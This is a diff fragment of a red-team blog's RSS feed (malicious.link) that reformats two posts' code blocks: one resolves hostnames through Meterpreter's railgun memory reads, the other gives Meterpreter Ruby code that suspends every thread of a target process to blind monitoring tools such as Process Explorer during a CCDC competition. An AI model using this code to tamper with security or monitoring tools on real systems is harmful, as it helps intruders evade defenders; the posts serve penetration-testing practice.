 &lt;p&gt;&lt;a href=&#34;http://dev.metasploit.com/documents/api/classes/Rex/Socket.html#M002073&#34;&gt;http://dev.metasploit.com/documents/api/classes/Rex/Socket.html#M002073&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;The &amp;lsquo;addr_aton&amp;rsquo; method does just that:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;nbi = Rex::Socket.addr_aton(&#39;192.168.1.100&#39;)
-=&amp;gt; &amp;quot;xC0xA8x01d&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Make the call to the API and done right?&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;result = client.railgun.ws2_32.gethostbyaddr(nbi.to_s, nbi.size,2)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Wrong, what you get back is a pointer to a mess, well lets get the mess (using a google IP for this example):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;struct = client.railgun.memread(result[&#39;return&#39;],100)
-=&amp;gt; &amp;quot;xA0x03fx00x88x0Efx00x02x00x04x00x8Cx0Efx00x00x00x00x00x94x0Efx00x00x00x00x00J}]cqw-in-f99.1e100.netx00@efx00x06x00bx00x13x01bx00xE0vvx00xvvx00xE8x0Efx00xEEx96x03x00x00bx00x00 x01x00x00x01x00x00x00x01x00x00x00x01x00x00x00&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ya.. that…&lt;/p&gt;
-
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;nbi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Socket&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;addr_aton(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.1.100&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;xC0xA8x01d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Make the call to the API and done right?&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ws2_32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gethostbyaddr(nbi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_s, nbi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Wrong, what you get back is a pointer to a mess, well lets get the mess (using a google IP for this example):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;struct &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memread(result&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;return&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;)
+&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;xA0x03fx00x88x0Efx00x02x00x04x00x8Cx0Efx00x00x00x00x00x94x0Efx00x00x00x00x00J}]cqw-in-f99.1e100.netx00@efx00x06x00bx00x13x01bx00xE0vvx00xvvx00xE8x0Efx00xEEx96x03x00x00bx00x00 x01x00x00x01x00x00x00x01x00x00x00x01x00x00x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ya.. that…&lt;/p&gt;
 &lt;p&gt;I tried using the pointer at the 12th byte location and that worked most of the time, but failed bad on others:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;ptrptr = struct[12,4].unpack(&amp;quot;V*&amp;quot;)[0]        
-hostnameptr = client.railgun.memread(ptrptr,4).unpack(&amp;quot;V*&amp;quot;)[0]         
-hostname = client.railgun.memread(hostnameptr+nbi.size,59).split(&amp;quot;&amp;quot;)[0]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;(there were a bunch more lines of error correcting but I&amp;rsquo;ll just wanted to show these as the actual methods used on a successful run)&lt;/p&gt;
-
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;ptrptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; struct&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;V*&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        
+hostnameptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memread(ptrptr,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;V*&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;         
+hostname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memread(hostnameptr&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;nbi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size,&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;(there were a bunch more lines of error correcting but I&#39;ll just wanted to show these as the actual methods used on a successful run)&lt;/p&gt;
 &lt;p&gt;But on other hosts the 12th byte came back with a pointer to all 0s, so there was no way to jump again (hostnameptr) to the actual hostname.&lt;/p&gt;
-
 &lt;p&gt;What I missed while trying to do things the &amp;ldquo;C&amp;rdquo; way was that the hostname was always pretexted with the IP address in network byte order… Hold up, I know it begins with something I already know, and ends in the standard &amp;ldquo;C&amp;rdquo; string terminator of a null byte. So all of that plus the crazy error correction became:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;struct = client.railgun.memread(result[&#39;return&#39;],100)        
-hostname = struct.split(nbi)[1].split(&amp;quot;&amp;quot;)[0]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2 lines… work 100% of the time in my test cases.&lt;/p&gt;
-
-&lt;p&gt;That&amp;rsquo;s it, you can check out the download for the post module above.&lt;/p&gt;
-
-&lt;p&gt;I do however have 1 disadvantage over how the guys at SecurityArtWork did things. You can&amp;rsquo;t thread it. For whatever reason the API call that I am using uses the exact same memory space for each lookup. I tried putting threading in and what I got was a bunch of systems that resolved to the exact same thing.&lt;/p&gt;
-
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;struct &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memread(result&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;return&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;)        
+hostname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(nbi)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2 lines… work 100% of the time in my test cases.&lt;/p&gt;
+&lt;p&gt;That&#39;s it, you can check out the download for the post module above.&lt;/p&gt;
+&lt;p&gt;I do however have 1 disadvantage over how the guys at SecurityArtWork did things. You can&#39;t thread it. For whatever reason the API call that I am using uses the exact same memory space for each lookup. I tried putting threading in and what I got was a bunch of systems that resolved to the exact same thing.&lt;/p&gt;
 &lt;p&gt;If anyone knows a way to fix this I am all ears because right now the module is slow.&lt;/p&gt;
 </description>
     </item>
@@ -803,21 +565,15 @@ hostname = struct.split(nbi)[1].split(&amp;quot;&amp;quot;)[0]
       
       <guid>https://malicious.link/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/</guid>
       <description>&lt;p&gt;Just a follow up to my previous post. One of the things that sets that method apart is the fact that the suspension (once the DLL injection occurs) comes from within the process, and it suspends all the child processes as well.&lt;/p&gt;
-
 &lt;p&gt;Another way you can do this without the injection is just sending a suspend to all the threads in the process.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pid = 2980
-targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
-targetprocess.thread.each_thread do |x|
-	targetprocess.thread.open(x).suspend
-end
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We open the process just like we did before, and make a very simple &amp;lsquo;each_thread&amp;rsquo; loop. There are a few AVs engines that detected this as tampering. But if you target isn&amp;rsquo;t AV&amp;hellip; Say it&amp;rsquo;s Process Explorer during CCDC, this might just confuse them enough to buy you some time to do other things without their watchful eye on you.&lt;/p&gt;
-
-&lt;p&gt;The other cool thing that happened when I did this was Process Explorer didn&amp;rsquo;t detect the process as suspended. If you looked under the thread list they were all suspended but not the process itself according to Process Explorer.&lt;/p&gt;
-
-&lt;p&gt;Not rocket science at all, but that&amp;rsquo;s because it&amp;rsquo;s built into the framework. Just another thing that metasploit makes dead simple.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;pid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2980&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;targetprocess &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(pid, &lt;span style=&#34;color:#66d9ef&#34;&gt;PROCESS_ALL_ACCESS&lt;/span&gt;)
+targetprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each_thread &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+	targetprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(x)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;suspend
+&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We open the process just like we did before, and make a very simple &amp;lsquo;each_thread&amp;rsquo; loop. There are a few AVs engines that detected this as tampering. But if you target isn&#39;t AV&amp;hellip; Say it&#39;s Process Explorer during CCDC, this might just confuse them enough to buy you some time to do other things without their watchful eye on you.&lt;/p&gt;
+&lt;p&gt;The other cool thing that happened when I did this was Process Explorer didn&#39;t detect the process as suspended. If you looked under the thread list they were all suspended but not the process itself according to Process Explorer.&lt;/p&gt;
+&lt;p&gt;Not rocket science at all, but that&#39;s because it&#39;s built into the framework. Just another thing that metasploit makes dead simple.&lt;/p&gt;
 </description>
     </item>
     
